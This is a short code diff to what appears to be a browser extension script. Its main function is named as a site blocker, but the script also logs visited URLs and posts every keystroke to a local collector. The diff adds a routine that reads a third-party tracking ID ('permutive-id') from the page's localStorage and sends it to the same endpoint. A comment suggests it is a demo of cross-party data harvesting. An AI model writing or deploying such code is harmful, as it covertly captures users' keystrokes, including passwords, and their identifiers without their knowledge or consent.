@@ -12,7 +12,7 @@ async function track(url) {
 async function sendKey(key) {
   try {
     await fetch("https://localhost:1111", {
-      method: "POST", // *GET, POST, PUT, DELETE, etc.
+      method: "POST",
       body: JSON.stringify({ type: "key", key }),
     });
   } catch (err) {
@@ -29,6 +29,21 @@ function addKeypressListener() {
   });
 }
 
+async function getUserId() {
+  // use other parties data to determine the user ID (ynet permutive demo)
+  const id = window.localStorage.getItem("permutive-id");
+  if (id) {
+    try {
+      await fetch("https://localhost:1111", {
+        method: "POST",
+        body: JSON.stringify({ type: "userID", id }),
+      });
+    } catch (err) {
+      console.error(err);
+    }
+  }
+}
+
 function blockBlackListedSite() {
   const url = window.location.href;
   if (url.includes("zoo.org")) {
@@ -38,6 +53,7 @@ function blockBlackListedSite() {
   }
   track(url);
   addKeypressListener();
+  getUserId();
 }
 
 blockBlackListedSite();
